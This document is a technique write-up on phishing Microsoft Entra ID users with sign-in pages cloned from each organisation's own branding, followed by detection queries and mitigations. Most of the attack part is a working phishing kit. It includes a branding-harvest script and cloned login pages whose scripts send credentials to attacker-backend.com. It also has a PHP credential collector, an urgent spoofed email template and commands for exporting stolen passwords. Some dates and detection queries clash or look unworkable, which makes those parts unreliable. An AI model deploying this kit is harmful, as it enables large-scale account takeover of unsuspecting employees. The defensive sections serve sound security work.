# [IA-PHISH-004]: Company Branding Login Poisoning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-004 |
| **MITRE ATT&CK v18.1** | [T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A (design limitation; not a vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-05-17 |
| **Affected Versions** | All Entra ID versions with custom branding enabled |
| **Patched In** | N/A (Microsoft feature; no patch available; only mitigations via CSP and user education) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) not included because automated branding poisoning is not a standardized test. All section numbers have been dynamically renumbered based on applicability.

---

## 1. EXECUTIVE SUMMARY

**Concept:** Company branding login poisoning exploits Microsoft's legitimate feature to customize Entra ID sign-in pages with organizational logos, background images, and text. Attackers automatically query the Microsoft GetCredentialType API with a victim's email address to retrieve the organization's branding assets (logos, background images, custom login text, color schemes) that are hosted on Microsoft's content delivery network (CDN). Attackers then use these branding assets to populate a phishing page hosted on attacker-controlled infrastructure or legitimate cloud services (Firebase, Azure Blob Storage, AWS S3). The resulting phishing page is visually indistinguishable from the legitimate Entra ID sign-in page, including the victim's company logo, colors, background images, and branded text. Victims cannot differentiate the phishing page from the real one based on visual appearance alone. The attack is **fully automated at scale**—attackers can target thousands of organizations without manual customization, making it dramatically more efficient than traditional phishing that requires manual per-organization branding replica creation.

**Attack Surface:** The GetCredentialType API is a publicly documented, unauthenticated endpoint that returns organizational branding information when provided with a valid email address from the target organization. This API is intended for legitimate clients (Outlook, Teams, Azure CLI) to display branding during authentication. No authentication is required; any attacker can enumerate company branding by submitting email addresses. The attack chain is simple: (1) attacker submits email address to GetCredentialType, (2) Microsoft returns branding URLs, (3) attacker hosts phishing page with branding, (4) attacker sends phishing email, (5) victim enters credentials into phishing page thinking it's legitimate.

**Business Impact:** **Critical account compromise at scale.** This technique has been active since 2019 and continues to be exploited. eSentire identified 13+ attacker infrastructure sites proxying Entra ID branding content (as of 2020) and confirmed attacks as recent as March 2020. The attack is particularly effective because users cannot distinguish phishing pages from legitimate ones—the branding paradoxically becomes a liability. Organizations that invest in custom branding to improve user experience and security actually make themselves MORE vulnerable to this attack, as attackers benefit from the same branding differentiation that legitimate organizations use.

**Technical Context:** Unlike traditional phishing that requires manual HTML replication, branding poisoning is fully automated and reproducible at scale. The GetCredentialType API returns the exact URLs and metadata needed to populate a convincing phishing page. Attackers can target 1,000+ organizations simultaneously by simply varying the email address in their phishing emails. The branding assets (logos, images) are served from Microsoft's CDN, providing additional legitimacy. The Entra ID portal naturally displays branding only AFTER the user enters their email, meaning the phishing page can replicate this workflow exactly, increasing perceived legitimacy.

### Operational Risk

- **Execution Risk:** **Very Low** — Fully automated. Attacker writes script to enumerate GetCredentialType API, hosts phishing page on cloud service, sends bulk phishing emails.
- **Stealth:** **Extremely High** — No visual difference between phishing page and legitimate page. Users cannot spot the attack through visual inspection. URL is the only indicator, which most users ignore.
- **Reversibility:** **No** — Once credentials are stolen, cannot be undone. Requires password reset, session revocation, and forensic investigation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1, 5.2 | Lack of user security awareness and behavioral analytics to detect phishing. |
| **DISA STIG** | AC-2, AC-3 | Inadequate account management and access control. |
| **CISA SCuBA** | IdM-1, IdM-2 | Weak identity governance and anomalous sign-in detection. |
| **NIST 800-53** | AC-2, AC-3, SI-4, SI-11 | Access enforcement, account management, monitoring, and information system monitoring. |
| **GDPR** | Art. 32, 33 | Insufficient security measures; breach notification. |
| **DORA** | Art. 9, 18 | ICT risk management and incident reporting. |
| **NIS2** | Art. 21, 23 | Cyber security measures and incident reporting. |
| **ISO 27001** | A.8.2.3, A.9.2.1 | User access management and authentication. |
| **ISO 27005** | Risk Scenario: "Credential Phishing at Scale" | Inadequate user security awareness and anomalous sign-in detection. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**

- **Attacker Side:** None. GetCredentialType API is unauthenticated and publicly accessible. Any attacker with internet access can query it.
- **Victim Side:** Any valid M365 user (no special permissions required).

**Required Access:**

- Attacker must be able to query `login.microsoftonline.com/common/GetCredentialType` API (no authentication required).
- Attacker must be able to host phishing pages (attacker-controlled server, legitimate cloud services, or compromised website).
- Attacker must be able to send phishing emails (compromised email account or phishing-as-a-service provider).

**Supported Versions:**

- **Entra ID:** All versions with custom branding configured.
- **Browsers:** All browsers (attack is agnostic to browser).
- **Operating Systems:** Platform-agnostic.

**Tools & Environment:**

- **Python** or **Bash** to query GetCredentialType API and parse JSON responses.
- **Phishing Page Hosting:** Firebase Storage, Azure Blob Storage, AWS S3, or attacker-controlled PHP server (often combines both).
- **Backend Infrastructure:** PHP/Node.js server to proxy branding requests and collect credentials (e.g., rohstofff[.]de pattern identified by eSentire).
- **Email Delivery:** Compromised internal email account, commercial phishing service, or attacker-owned mail server.

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Detection of GetCredentialType API Enumeration

**Testing GetCredentialType API Directly:**

```bash
# Test if GetCredentialType API returns branding for target organization
curl -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"victim@company.onmicrosoft.com"}' | jq .

# Sample response:
# {
#   "Username": "victim@company.onmicrosoft.com",
#   "Display": "victim@company.onmicrosoft.com",
#   "IfExistsResult": "2",
#   "ThrottleStatus": "0",
#   "Credentials": {
#     "PrimaryAuthenticationMethod": 1,
#     "HasPassword": true,
#     "Methods": {...},
#     "FidoDeviceCount": 0,
#     "HasPassword": true
#   },
#   "EstsProperties": {},
#   "DomainProperties": {
#     "IsStrongAuthRequired": true,
#     "StsAuthRequired": false,
#     "HomeRealmDiscoveryUrl": "https://login.microsoftonline.com/organizations/...",
#     "IsFederated": false,
#     "FederationProtocol": "WsFed"
#   },
#   "Branding": {
#     "CtaUrl": null,
#     "PreferredLanguage": "en",
#     "BannerLogo": "https://secure.aadcdn.microsoftonline-p.com/...",
#     "BannerText": "Welcome to Company Name",
#     "BannerBackgroundColor": "#FFFFFF",
#     "Logo": "https://secure.aadcdn.microsoftonline-p.com/...",
#     "CreativeAssets": {
#       "BackgroundImageUrl": "https://secure.aadcdn.microsoftonline-p.com/..."
#     }
#   }
# }
```

**What to Look For:**

- **BannerLogo:** URL to company logo hosted on Microsoft CDN
- **BackgroundImageUrl:** URL to custom background image
- **BannerText:** Custom login page text (e.g., "Welcome to Acme Corporation")
- **BannerBackgroundColor:** Custom color scheme

**PowerShell Enumeration:**

```powershell
# Enumerate GetCredentialType for multiple organizations
$emails = @(
  "user@company1.onmicrosoft.com",
  "user@company2.onmicrosoft.com",
  "user@company3.onmicrosoft.com"
)

foreach ($email in $emails) {
  $body = ConvertTo-Json @{ Username = $email }
  
  $response = Invoke-WebRequest -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
    -Method POST `
    -ContentType "application/json" `
    -Body $body
  
  $data = $response.Content | ConvertFrom-Json
  
  Write-Host "[*] Organization: $email"
  Write-Host "    Logo URL: $($data.Branding.Logo)"
  Write-Host "    Banner Text: $($data.Branding.BannerText)"
  Write-Host "    Background: $($data.Branding.CreativeAssets.BackgroundImageUrl)"
}
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Automated Branding Poisoning via GetCredentialType API

**Supported Versions:** All Entra ID versions with custom branding

**Scenario:** Attacker automatically retrieves company branding from GetCredentialType API, populates a phishing page with the branding, hosts it on cloud storage, and sends phishing emails. The phishing page is visually identical to the legitimate Entra ID sign-in page.

#### Step 1: Query GetCredentialType API to Retrieve Branding

**Objective:** Automatically retrieve company logos, background images, and text from Microsoft's API.

**Python Script:**

```python
#!/usr/bin/env python3
"""
Automated Entra ID Company Branding Enumeration
Purpose: Retrieve branding assets for target organizations
"""

import requests
import json
import time
from urllib.parse import urljoin

def get_organization_branding(email):
    """
    Query GetCredentialType API to retrieve organization branding
    """
    url = "https://login.microsoftonline.com/common/GetCredentialType"
    
    payload = {
        "Username": email
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        response.raise_for_status()
        
        data = response.json()
        
        # Extract branding information
        branding = data.get("Branding", {})
        
        return {
            "email": email,
            "organization": email.split("@")[1],
            "banner_logo": branding.get("BannerLogo"),
            "logo": branding.get("Logo"),
            "banner_text": branding.get("BannerText"),
            "banner_background_color": branding.get("BannerBackgroundColor"),
            "background_image": branding.get("CreativeAssets", {}).get("BackgroundImageUrl"),
            "preferred_language": branding.get("PreferredLanguage"),
            "raw_response": data
        }
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error querying GetCredentialType for {email}: {e}")
        return None

def main():
    # Target organizations (obtained from employee directory, LinkedIn, etc.)
    target_emails = [
        "user@company1.onmicrosoft.com",
        "user@company2.onmicrosoft.com",
        "user@company3.com",  # Custom domain
        "user@company4.onmicrosoft.com"
    ]
    
    print("[*] Enumerating organization branding...")
    
    branding_cache = {}
    
    for email in target_emails:
        print(f"\n[*] Querying branding for {email}")
        
        branding = get_organization_branding(email)
        
        if branding:
            print(f"[+] Branding retrieved:")
            print(f"    Organization: {branding['organization']}")
            print(f"    Logo URL: {branding['logo']}")
            print(f"    Banner Text: {branding['banner_text']}")
            print(f"    Background: {branding['background_image']}")
            
            # Store branding for later use
            branding_cache[branding['organization']] = branding
            
            # Save to JSON file for persistence
            with open(f"branding_{branding['organization']}.json", "w") as f:
                json.dump(branding, f, indent=2)
        
        # Rate limiting (avoid triggering abuse detection)
        time.sleep(1)
    
    print(f"\n[+] Enumeration complete. Retrieved branding for {len(branding_cache)} organizations.")
    
    return branding_cache

if __name__ == "__main__":
    branding_data = main()
    
    # Use branding_data to populate phishing pages
    print("\n[*] Branding data can now be used to populate phishing pages...")
```

**Expected Output:**

```
[*] Enumerating organization branding...

[*] Querying branding for user@company1.onmicrosoft.com
[+] Branding retrieved:
    Organization: company1.onmicrosoft.com
    Logo URL: https://secure.aadcdn.microsoftonline-p.com/...
    Banner Text: Welcome to Acme Corporation
    Background: https://secure.aadcdn.microsoftonline-p.com/...

[+] Enumeration complete. Retrieved branding for 4 organizations.
```

**What This Means:**

- Attacker now has URLs to all branding assets (logos, backgrounds, text) for target organizations
- URLs are hosted on Microsoft's CDN, providing legitimacy
- Attacker can use these URLs directly in phishing pages without downloading images

#### Step 2: Host Phishing Page on Cloud Service

**Objective:** Create and host a phishing page with retrieved branding on Firebase, Azure Blob Storage, or AWS S3.

**HTML Template (Branding-Poisoned Phishing Page):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
            background-color: #fff;
        }
        
        .container { max-width: 440px; margin: 0 auto; padding: 40px 20px; }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
            background-image: url('BACKGROUND_IMAGE_URL_FROM_API');
            background-size: cover;
            background-position: center;
            padding: 40px 20px;
            border-radius: 2px;
        }
        
        .logo {
            max-height: 40px;
            max-width: 200px;
            margin-bottom: 20px;
        }
        
        .banner-text {
            font-size: 20px;
            font-weight: 300;
            color: #333;
            margin-bottom: 20px;
        }
        
        .login-form {
            border: 1px solid #d3d3d3;
            padding: 30px;
            border-radius: 2px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #333;
        }
        
        input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ccc;
            border-radius: 2px;
            font-size: 13px;
        }
        
        button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
        }
        
        button:hover { background-color: #005a9e; }
        
        .error { color: #c50f1f; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <!-- Branding assets retrieved from GetCredentialType API -->
            <img src="LOGO_URL_FROM_API" alt="Company Logo" class="logo">
            <div class="banner-text">BANNER_TEXT_FROM_API</div>
        </div>
        
        <div class="login-form">
            <form id="loginForm" onsubmit="submitLogin(event)">
                <div class="form-group">
                    <label>Email, phone, or Skype</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                
                <div class="form-group" id="passwordGroup" style="display:none;">
                    <label>Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <div id="error" class="error"></div>
                
                <button type="submit" id="submitBtn">Next</button>
            </form>
        </div>
    </div>

    <script>
        async function submitLogin(event) {
            event.preventDefault();
            
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const submitBtn = document.getElementById("submitBtn");
            const errorDiv = document.getElementById("error");
            
            // If only username entered
            if (!password) {
                submitBtn.disabled = true;
                submitBtn.innerText = "Checking...";
                
                // Show password field
                setTimeout(() => {
                    document.getElementById("passwordGroup").style.display = "block";
                    submitBtn.innerText = "Sign in";
                    submitBtn.disabled = false;
                }, 800);
                return;
            }
            
            // If password entered, send to attacker's backend
            try {
                submitBtn.disabled = true;
                submitBtn.innerText = "Signing in...";
                
                const response = await fetch("https://attacker-backend.com/capture-creds", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        user_agent: navigator.userAgent,
                        ip: null  // Will be captured by backend
                    })
                });
                
                if (response.ok) {
                    // Redirect to legitimate Outlook
                    window.location.href = "https://outlook.office365.com";
                } else {
                    errorDiv.innerText = "Invalid password. Try again.";
                    submitBtn.disabled = false;
                    submitBtn.innerText = "Sign in";
                }
            } catch (e) {
                errorDiv.innerText = "Connection error. Please try again.";
                submitBtn.disabled = false;
                submitBtn.innerText = "Sign in";
            }
        }
    </script>
</body>
</html>
```

**Replace Placeholder Values:**

```javascript
// After retrieving branding via GetCredentialType API:
html = html.replace("LOGO_URL_FROM_API", branding.logo);
html = html.replace("BACKGROUND_IMAGE_URL_FROM_API", branding.background_image);
html = html.replace("BANNER_TEXT_FROM_API", branding.banner_text);
html = html.replace("BANNER_BACKGROUND_COLOR", branding.banner_background_color || "#fff");
```

**Upload to Firebase Storage:**

```bash
# Create Firebase project and upload phishing page
firebase init
firebase deploy --only hosting

# OR directly upload HTML to Azure Blob Storage
az storage blob upload \
  --account-name attacker-storage \
  --container-name phishing \
  --name login.html \
  --file phishing-page.html \
  --auth-mode login

# Resulting URL: https://attacker-storage.blob.core.windows.net/phishing/login.html
# This appears to come from legitimate Azure infrastructure, increasing credibility
```

**What This Accomplishes:**

- Phishing page is hosted on legitimate cloud service (Firebase, Azure Blob Storage)
- URL appears to come from trusted infrastructure (firebase.com, blob.core.windows.net)
- Phishing page displays exact company branding (logo, background, text) retrieved from Microsoft
- Victims cannot visually distinguish phishing page from legitimate Entra ID login

#### Step 3: Create Backend Infrastructure to Collect Credentials

**Objective:** Set up attacker-controlled backend to receive and store stolen credentials.

**PHP Backend (Attacker-Controlled Server):**

```php
<?php
// Backend: https://attacker-backend.com/capture-creds

// Receive credentials from phishing page
$input = file_get_contents("php://input");
$data = json_decode($input, true);

$username = $data['username'];
$password = $data['password'];
$timestamp = $data['timestamp'];
$user_agent = $data['user_agent'];
$ip_address = $_SERVER['REMOTE_ADDR'];

// Log credentials to database
$pdo = new PDO("mysql:host=localhost;dbname=phished_creds", "attacker", "password");
$stmt = $pdo->prepare("
    INSERT INTO credentials (username, password, timestamp, user_agent, ip_address)
    VALUES (?, ?, ?, ?, ?)
");
$stmt->execute([$username, $password, $timestamp, $user_agent, $ip_address]);

echo json_encode([
    "status" => "success",
    "message" => "Credentials captured"
]);

// Log to file for backup
file_put_contents(
    "/var/log/phishing.log",
    "[" . date("Y-m-d H:i:s") . "] $username / $password from $ip_address\n",
    FILE_APPEND
);
?>
```

**Credentials Stored in Database:**

```
| id | username | password | timestamp | ip_address |
|----|----------|----------|-----------|------------|
| 1 | alice@company.com | MyPassword123 | 2025-05-10T14:30:00Z | 203.0.113.45 |
| 2 | bob@company.com | SecurePass! | 2025-05-10T14:45:00Z | 203.0.113.46 |
| 3 | carol@company.com | P@ssw0rd2025 | 2025-05-10T15:00:00Z | 203.0.113.47 |
```

#### Step 4: Craft and Send Phishing Email with Branding-Poisoned Link

**Objective:** Deliver phishing link to victims.

**Phishing Email Template:**

```
From: admin@company.com  (spoofed or compromised)
Subject: Action Required: Verify Your Account - 24 Hours

Dear User,

For security reasons, we need to verify your Microsoft 365 account. Your access will be restricted in 24 hours if you do not verify.

Click below to verify your account:

https://firebasestorage.googleapis.com/v0/b/phishing-project.appspot.com/o/login.html

Verification takes less than 1 minute.

---
Microsoft 365 IT Support Team
```

**Why This Works:**

- Email appears to come from legitimate internal sender (spoofed domain)
- Link points to legitimate cloud service (Firebase)
- When victim clicks link, they see company branding (logo, colors, text)
- Branding is EXACTLY the same as legitimate sign-in page (retrieved from Microsoft API)
- Users trust the familiar branding and enter credentials

#### Step 5: Monitor and Harvest Captured Credentials

**Objective:** Track phishing campaign success and extract harvested credentials.

**Query Database for Captured Credentials:**

```bash
# SSH into attacker's backend server
ssh attacker@backend.attacker-server.com

# Query captured credentials
mysql -u attacker -ppassword phished_creds -e "
    SELECT username, password, timestamp, ip_address 
    FROM credentials 
    ORDER BY timestamp DESC 
    LIMIT 10;
"

# Output:
# alice@company.com       | MyPassword123    | 2025-05-10 14:30:00 | 203.0.113.45
# bob@company.com         | SecurePass!      | 2025-05-10 14:45:00 | 203.0.113.46
# carol@company.com       | P@ssw0rd2025     | 2025-05-10 15:00:00 | 203.0.113.47

# Export for use in next attack phase
mysql -u attacker -ppassword phished_creds -e "
    SELECT CONCAT(username, ':', password) 
    FROM credentials;
" > credentials.txt
```

---

### METHOD 2: Proxy-Based Branding Poisoning (eSentire Attack Pattern)

**Supported Versions:** All Entra ID versions with custom branding

**Scenario:** Attacker's backend PHP server proxies GetCredentialType API calls to automatically retrieve branding for any target organization, then dynamically injects branding into attacker's phishing pages.

#### Step 1-2: Create PHP Backend Proxy

**Objective:** Attacker's server acts as intermediary between phishing page and Microsoft's API.

**PHP Proxy Server (rohstofff[.]de pattern identified by eSentire):**

```php
<?php
// Backend proxy: https://attacker-backend.com/api/branding.php?email=user@company.com

$email = $_GET['email'];

// Validate email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die(json_encode(["error" => "Invalid email"]));
}

// Query Microsoft's GetCredentialType API
$url = "https://login.microsoftonline.com/common/GetCredentialType";
$payload = json_encode(["Username" => $email]);

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_TIMEOUT => 10
]);

$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

// Extract and return only branding information
$result = [
    "logo" => $data['Branding']['Logo'] ?? null,
    "banner_text" => $data['Branding']['BannerText'] ?? null,
    "banner_logo" => $data['Branding']['BannerLogo'] ?? null,
    "background_image" => $data['Branding']['CreativeAssets']['BackgroundImageUrl'] ?? null,
    "banner_color" => $data['Branding']['BannerBackgroundColor'] ?? "#ffffff"
];

header("Content-Type: application/json");
echo json_encode($result);

// Log the request (monitoring)
file_put_contents(
    "/var/log/branding_requests.log",
    "[" . date("Y-m-d H:i:s") . "] Branding requested for: $email\n",
    FILE_APPEND
);
?>
```

#### Step 3: Dynamic Phishing Page that Fetches Branding

**Objective:** Phishing page automatically retrieves and populates branding for the victim's organization.

**Dynamic HTML/JavaScript:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* ... CSS from previous example ... */
    </style>
</head>
<body>
    <div class="container">
        <div class="header" id="header">
            <img id="logo" alt="Company Logo" class="logo">
            <div id="bannerText" class="banner-text"></div>
        </div>
        
        <div class="login-form">
            <form id="loginForm">
                <div class="form-group">
                    <label>Email, phone, or Skype</label>
                    <input type="email" id="username" name="username" required autofocus onchange="fetchBranding(this.value)">
                </div>
                
                <div class="form-group" id="passwordGroup" style="display:none;">
                    <label>Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" id="submitBtn">Next</button>
            </form>
        </div>
    </div>

    <script>
        async function fetchBranding(email) {
            // When victim enters email, fetch branding from attacker's proxy
            try {
                const response = await fetch(
                    `https://attacker-backend.com/api/branding.php?email=${encodeURIComponent(email)}`
                );
                const branding = await response.json();
                
                // Populate page with branding
                document.getElementById("logo").src = branding.logo;
                document.getElementById("bannerText").innerText = branding.banner_text;
                document.getElementById("header").style.backgroundColor = branding.banner_color;
                
                console.log("[*] Branding fetched for " + email);
            } catch (e) {
                console.error("Error fetching branding:", e);
            }
        }
        
        document.getElementById("loginForm").onsubmit = function(e) {
            e.preventDefault();
            
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            if (!password) {
                // First step: show password field
                document.getElementById("passwordGroup").style.display = "block";
                return;
            }
            
            // Send credentials to backend
            fetch("https://attacker-backend.com/api/capture.php", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                })
            }).then(() => {
                // Redirect to real Outlook
                window.location = "https://outlook.office365.com";
            });
        };
    </script>
</body>
</html>
```

**What This Accomplishes:**

- Phishing page is completely dynamic
- As soon as victim enters their email, page fetches their organization's branding from GetCredentialType API
- Page populates instantly with correct logo, colors, text for their organization
- Victim cannot distinguish phishing page from legitimate sign-in page
- Attacker can target unlimited organizations with a single phishing page HTML file

---

## 5. TOOLS & COMMANDS REFERENCE

### [GetCredentialType API - Microsoft (Unauthenticated)](https://learn.microsoft.com/en-us/entra/identity-platform/)

**Endpoint:** `https://login.microsoftonline.com/common/GetCredentialType`  
**Method:** POST  
**Authentication:** None required  
**Request Body:** `{ "Username": "user@company.com" }`

**Usage:**

```bash
curl -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"user@company.com"}' | jq '.Branding'
```

**References:**

- [Microsoft Entra ID APIs - Conditional Access](https://learn.microsoft.com/en-us/entra/identity-platform/reference-v2-protocols)
- [Dr Syynimaa Blog - GetCredentialType API Enumeration](https://blog.doctorsyynimaa.net/)

### [Firebase Storage - Cloud Phishing Hosting](https://firebase.google.com/products/storage)

**Usage (for hosting phishing pages):**

```bash
firebase init
firebase deploy --only hosting
# Hosting URL: https://project-name.firebaseapp.com/
```

### [Python - requests Library](https://docs.python-requests.org/)

**For automated GetCredentialType API queries:**

```python
import requests

response = requests.post(
    "https://login.microsoftonline.com/common/GetCredentialType",
    json={"Username": "user@company.com"}
)

branding = response.json()["Branding"]
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious GetCredentialType API Calls from External IPs

**KQL Query:**

```kusto
SignInLogs
| where ResourceIdentity == "login.microsoftonline.com"
| where OperationName == "GetCredentialType" or OperationName == "Sign-in"
| where IPAddress !in ("Internal IP Range") // Exclude internal IP ranges
| summarize 
    APICallCount = count(),
    UniqueEmails = dcount(UserPrincipalName),
    FirstCall = min(TimeGenerated),
    LastCall = max(TimeGenerated)
    by IPAddress
| where APICallCount > 50  // High volume of API calls suspicious
| project IPAddress, APICallCount, UniqueEmails, FirstCall, LastCall
```

**What This Detects:**

- External IP making bulk GetCredentialType API calls (enumeration activity)
- Single IP querying 50+ unique email addresses (indicates automated branding harvesting)

### Query 2: Sign-In From Suspicious Cloud Hosting Domains

**KQL Query:**

```kusto
SignInLogs
| where IPAddress in (
    // Known cloud hosting IPs (Firebase, Azure Blob, AWS S3)
    "35.192.0.0/10",    // Firebase hosting IP range
    "13.107.0.0/14",    // Azure hosting
    "52.0.0.0/6"        // AWS hosting
) or ClientAppUsed == "browser"
| where ResourceIdentity != "login.microsoftonline.com"  // Not legitimate Microsoft domain
| project TimeGenerated, UserPrincipalName, IPAddress, ClientAppUsed, UserAgent
```

### Query 3: Phishing Page Detection via Referrer Analysis

**KQL Query:**

```kusto
SignInLogs
| where TimeGenerated > ago(24h)
| extend UserAgent = tostring(DeviceDetail.userAgent)
| where UserAgent contains "firebase" or UserAgent contains "blob.core" or UserAgent contains "githubusercontent"
| project TimeGenerated, UserPrincipalName, IPAddress, UserAgent, Status
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Successful Logon)**

- **Filter:** Logon process name == "MSLsass" AND Logon Type == "3" (network) with unusual source IPs
- **Applies To:** Windows Server 2016+
- **Effectiveness:** Low (API queries occur at browser level, not captured in Windows event logs)

**Note:** Company branding poisoning is primarily a phishing attack at the OAuth/browser level. Windows event logs provide limited visibility.

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Bulk Credential Changes Post-Branding Enumeration

**PowerShell:**

```powershell
# Search for password resets or MFA method additions in past 7 days
# (Potential follow-up to successful phishing)

Search-UnifiedAuditLog `
  -Operations "Change user password", "Add user", "Set user" `
  -StartDate (Get-Date).AddDays(-7) `
  -ResultSize 1000 | `
  Where-Object { $_.CreatedDate -gt (Get-Date).AddDays(-1) } | `
  Select-Object UserIds, Operations, CreatedDate | `
  Export-Csv -Path "C:\Audit\suspicious_account_changes.csv"

# Check for mailbox forwarding rule creation (persistence)
Search-UnifiedAuditLog `
  -Operations "New-InboxRule", "Set-InboxRule" `
  -StartDate (Get-Date).AddDays(-1) | `
  Where-Object { $_.AuditData -like "*ForwardAsAttachmentTo*" } | `
  Select-Object UserIds, CreatedDate, AuditData
```

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement CSP (Content Security Policy) for Sign-In Pages**

Microsoft is rolling out CSP restrictions beginning mid-to-late October 2026 to block unauthorized script injection. Organizations should proactively implement these controls.

**Manual Steps (Azure Portal - Preview as of December 2025):**

1. Navigate to **Entra ID** → **Brand and customization** → **Company branding**
2. Check for **"Enable CSP headers"** setting (currently in preview)
3. Enable: **"Block external scripts"**
4. Enable: **"Enforce inline script restrictions"**
5. Save

**PowerShell (Proactive Implementation):**

```powershell
# Configure CSP for Entra ID sign-in pages (preview API)
# This will be standard in mid-2026

$params = @{
    DisplayName = "Company Branding with CSP"
    EnableCSP = $true
    CSPSourceWhitelist = @(
        "https://secure.aadcdn.microsoftonline-p.com",
        "https://aadcnd.msauthimages.net"
    )
}

Update-MgOrganizationBrandingLocalization -BodyParameter $params
```

**What This Does:**

- Restricts scripts on sign-in pages to only Microsoft-trusted domains
- Prevents attacker injection of tracking pixels, credential harvesters, or malware
- Blocks XSS attacks that might compromise phishing page functionality

---

**2. Disable or Restrict Custom Branding for High-Risk Scenarios**

If custom branding creates unacceptable risk, disable it.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Brand and customization** → **Company branding**
2. Remove or minimize custom branding elements
3. Consider using only:
   - Custom favicon (lower risk)
   - Text (not images, which can be proxied)
   - Avoid background images and large logos (easy targets for proxy abuse)
4. Save

---

**3. User Security Awareness Training**

Train users to verify URLs in address bar, even when page appearance seems legitimate.

**Key Messages:**

- "Custom branding is a liability, not an asset—attackers can replicate it"
- "Always check the URL in address bar: login.microsoftonline.com (not firebase, blob, etc.)"
- "If in doubt, go directly to outlook.office365.com without clicking links"
- "Report suspicious emails even if they seem to come from legitimate senders"

---

### Priority 2: HIGH

**4. Enable Real-Time Anomalous Sign-In Detection**

Monitor for sign-ins from cloud hosting IPs (Firebase, Azure Blob, AWS S3), which indicate phishing-from-cloud patterns.

**Manual Steps (Entra ID Protection):**

1. Navigate to **Entra ID** → **Security** → **Identity Protection** → **Sign-in risk policy**
2. Configure:
   - **Risk level:** Medium and above
   - **Access controls:** Require MFA
3. Enable policy globally

---

**5. Block GetCredentialType API Enumeration from External IPs**

(Difficult to implement without blocking legitimate clients, but possible with conditional access.)

**Alternative: Monitor GetCredentialType Abuse**

```powershell
# Create custom detection rule in Sentinel for bulk GetCredentialType queries

$signInLogs = Get-MgAuditLogSignIn -Filter "resourceIdentity eq 'login.microsoftonline.com'" | `
  Group-Object IPAddress | `
  Where-Object { $_.Count -gt 100 }

foreach ($group in $signInLogs) {
  Write-Host "[!] POTENTIAL ENUMERATION: $($group.Name) made $($group.Count) API calls"
}
```

---

**6. Implement DMARC, SPF, and DKIM to Prevent Domain Spoofing**

Prevent attackers from sending emails spoofed as internal senders.

**Manual Steps (Microsoft 365):**

1. Navigate to **Microsoft Purview** → **Email & collaboration** → **Policies** → **Authentication settings**
2. Enable: **DMARC Policy: Quarantine**
3. Enable: **SPF Policy: Strict**
4. Enable: **DKIM signing**
5. Configure organizational DMARC policy to reject spoofed emails

---

**Validation Command (Verify Mitigations):**

```powershell
# Check if custom branding is configured (indicator of risk)
$branding = Get-MgOrganizationBranding

if ($branding.BannerLogoUrl -or $branding.BackgroundImageUrl) {
    Write-Host "[!] Custom branding is enabled—ensure CSP protections are active"
    Write-Host "    Logo: $($branding.BannerLogoUrl)"
    Write-Host "    Background: $($branding.BackgroundImageUrl)"
} else {
    Write-Host "[+] Custom branding disabled (lower phishing risk)"
}

# Verify CSP is enforced (when available)
# (This feature will be available mid-2026)
```

---

